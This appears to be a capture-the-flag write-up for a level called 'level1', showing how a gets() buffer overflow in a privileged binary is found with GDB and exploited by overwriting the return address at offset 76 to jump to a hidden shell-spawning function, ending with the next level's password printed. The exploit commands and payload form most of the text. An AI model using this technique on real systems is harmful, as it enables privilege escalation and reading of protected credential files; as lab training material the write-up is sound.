a binary with elevated permissions can be found in the directory

running it we see that it takes input from stdin, then closes
this is due to a gets() call in main

if we enter too many characters we get a segfault
python -c "print 'a' * 100" > tmp/test1
cat /tmp/test1 | ./level1
Segmentation fault (core dumped)

this is a buffer overflow

using GDB we can see the address of the segfault
gdb level1
(gdb) r < /tmp/level1
Starting program: /home/user/level1/level1 < /tmp/test1

Program received signal SIGSEGV, Segmentation fault.
0x61616161 in ?? ()

61 is the ascii value of 'a', the character we used to cause the overflow
it has overwritten the gets() call continue address


After dissassembling we can see that similar to level0, there is a bin_sh call in the binary but it is in a block of code (run) that is not executed.
Using the right ammount of padding the buffer overflow will allow us to inject the address of this code (0x08048444) and run it

we can use https://wiremask.eu/tools/buffer-overflow-pattern-generator/ to find the exact size that will cause a buffer overflow (76)
the binary is little endian so we must reverse the bits
python -c "print 'a' * 76 + '\x08\x04\x84\x44'[::-1]" > /tmp/inj1
the '-' cat parameter allows us to preserve stdin

cat /tmp/inj1 - | ./level1
Good... Wait what?
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
